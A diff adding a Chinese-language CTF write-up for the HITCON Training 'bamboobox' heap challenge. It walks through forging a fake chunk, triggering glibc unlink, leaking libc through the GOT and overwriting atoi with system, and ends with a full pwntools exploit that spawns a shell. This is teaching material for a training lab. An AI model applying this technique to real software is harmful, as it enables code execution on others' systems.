@@ -120,6 +120,199 @@ if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
 
 ptr 处的指针会变为 ptr - 0x18。
 
+## HITCON Training Lab11: bamboobox
+[题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/bamboofox)
+
+### 基本信息
+```shell
+# zer0ptr @ zer0ptr-MateBook-D14 in ~/HITCON-Training/LAB/lab11 on git:master x [13:31:17]
+$ file bamboobox
+bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
+
+# zer0ptr @ zer0ptr-MateBook-D14 in ~/HITCON-Training/LAB/lab11 on git:master x [13:31:19]
+$ checksec bamboobox
+Arch:      amd64
+RELRO:     Partial RELRO
+Stack:     Canary found
+NX:        NX enabled
+PIE:       No PIE
+Stripped:  No
+```
+四个函数，分别对应`show()`, `add()`, `change()`, `free()`
+
+### 堆布局
+
+#### 分配chunk
+```python
+additem(0x40, b"a"*8)   # chunk0 - 存放 fake chunk 的容器
+additem(0x80, b"b"*8)   # chunk1 - 将被 free 触发 unlink
+additem(0x40, b"c"*8)   # chunk2 - 隔离层，防止合并到 top chunk
+```
+此时内存布局如下：
+```text
+低地址                                   高地址
+[chunk0: 0x50] [chunk1: 0x90] [chunk2: 0x50] [top chunk]
+```
+
+#### 构造fake chunk
+```python
+ptr = 0x6020c8  # chunk0 指针的存储位置
+
+fake_chunk = p64(0)                    # fake chunk 的 prev_size
+fake_chunk += p64(0x41)                # fake chunk 的 size (0x40 + 1)
+fake_chunk += p64(ptr - 0x18)          # fd 指向 &global[2]-0x18
+fake_chunk += p64(ptr - 0x10)          # bk 指向 &global[2]-0x10
+fake_chunk += b"c" * 0x20              # 填充到 chunk0 数据区末尾
+fake_chunk += p64(0x40)                # 覆盖 chunk1.prev_size = 0x40
+fake_chunk += p64(0x90)                # 覆盖 chunk1.size，清除 PREV_INUSE 位
+```
+
+#### unlink
+```python
+change(0, 0x80, fake_chunk)   # 编辑 chunk0，覆盖 chunk1 的 header
+remove(1)                      # free chunk1，触发 unlink
+```
+此时就执行 `unlink fake_chunk`，global[2] 指针被修改为 &global[2]-0x18 (0x6020b0)
+
+#### leak
+```python
+atoi_got = elf.got['atoi']
+payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
+change(0, 0x80, payload)
+show()                                  
+r.recvuntil(b"0 : ")                     
+leak_data = r.recvuntil(b":")[:6]       
+atoi_addr = u64(leak_data.ljust(8, b"\x00"))  
+libc = LibcSearcher('atoi', atoi_addr)   
+libc_base = atoi_addr - libc.dump('atoi')
+system_addr = libc_base + libc.dump('system')
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+```
+
+#### getshell
+```python
+change(0, 0x8, p64(system_addr)) 
+r.recvuntil(b":")
+r.sendline(b"/bin/sh\x00")       
+r.interactive()                   
+```
+
+完整的exp如下：
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import LibcSearcher
+
+context.log_level = 'debug'
+context(arch='amd64', os='linux')
+
+r = process('./bamboobox')
+elf = ELF('./bamboobox') 
+
+def additem(length, name):
+    r.recvuntil(b":")
+    r.sendline(b"2")
+    r.recvuntil(b":")
+    r.sendline(str(length).encode())
+    r.recvuntil(b":")
+    r.send(name)
+
+def change(idx, length, name):
+    r.recvuntil(b":")
+    r.sendline(b"3")
+    r.recvuntil(b":")
+    r.sendline(str(idx).encode())
+    r.recvuntil(b":")
+    r.sendline(str(length).encode())
+    r.recvuntil(b":")
+    r.send(name)
+
+def remove(idx):
+    r.recvuntil(b":")
+    r.sendline(b"4")
+    r.recvuntil(b":")
+    r.sendline(str(idx).encode())
+
+def show():
+    r.recvuntil(b":")
+    r.sendline(b"1")
+
+# ========== Step 1: 分配堆块 ==========
+print("[*] Step 1: Allocating chunks...")
+additem(0x40, b"a"*8)   # chunk 0
+additem(0x80, b"b"*8)   # chunk 1
+additem(0x40, b"c"*8)   # chunk 2
+
+# ========== Step 2: 构造 fake chunk ==========
+print("[*] Step 2: Constructing fake chunk...")
+ptr = 0x6020c8  # chunk0 指针的存储位置
+
+# 构造 fake chunk
+fake_chunk = p64(0)                    # prev_size
+fake_chunk += p64(0x41)                # size (0x40 + 0x1, PREV_INUSE=1)
+fake_chunk += p64(ptr - 0x18)          # fd
+fake_chunk += p64(ptr - 0x10)          # bk
+fake_chunk += b"c" * 0x20              # 填充到 chunk0 数据区末尾
+fake_chunk += p64(0x40)                # 覆盖 chunk1 的 prev_size
+fake_chunk += p64(0x90)                # 覆盖 chunk1 的 size (清除 PREV_INUSE 位)
+
+print("[*] Step 3: Triggering overflow and unlink...")
+change(0, 0x80, fake_chunk)
+remove(1)  # 触发 unlink
+
+# ========== Step 3: 利用 unlink 后的任意地址写 ==========
+print("[*] Step 4: Exploiting arbitrary write...")
+
+# 此时 chunk0 的指针指向 ptr-24 (0x6020b0)
+# 构造 payload 将 chunk0 指针改为指向 atoi 的 GOT
+atoi_got = elf.got['atoi']
+payload = p64(0) * 2 + p64(0x40) + p64(atoi_got)
+change(0, 0x80, payload)
+
+# ========== Step 4: 泄露 atoi 地址 ==========
+print("[*] Step 5: Leaking atoi address...")
+show()
+
+# 接收泄露的地址
+r.recvuntil(b"0 : ")
+leak_data = r.recvuntil(b":")[:6]  # 接收6个字节
+atoi_addr = u64(leak_data.ljust(8, b"\x00"))
+print(f"[+] Leaked atoi address: {hex(atoi_addr)}")
+
+# ========== Step 5: 使用 LibcSearcher 确定 libc 版本 ==========
+print("[*] Step 6: Searching libc version...")
+libc = LibcSearcher('atoi', atoi_addr)
+
+# 获取 libc 基址
+libc_base = atoi_addr - libc.dump('atoi')
+print(f"[+] libc base: {hex(libc_base)}")
+
+# 获取 system 地址
+system_addr = libc_base + libc.dump('system')
+print(f"[+] system address: {hex(system_addr)}")
+
+# 获取 /bin/sh 地址
+binsh_addr = libc_base + libc.dump('str_bin_sh')
+print(f"[+] /bin/sh address: {hex(binsh_addr)}")
+
+# 可选：获取 one_gadget (libc-2.23 常见偏移)
+one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+for og in one_gadgets:
+    print(f"[+] possible one_gadget: {hex(libc_base + og)}")
+
+# ========== Step 6: 劫持控制流 ==========
+print("[*] Step 7: Hijacking control flow...")
+
+# 修改 atoi 的 GOT 为 system
+change(0, 0x8, p64(system_addr))
+
+# 触发 system('/bin/sh')
+r.recvuntil(b":")
+r.sendline(b"/bin/sh\x00")
+r.interactive()
+```
+
 ## 2014 HITCON stkof
 
 [题目链接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/unlink/2014_hitcon_stkof)
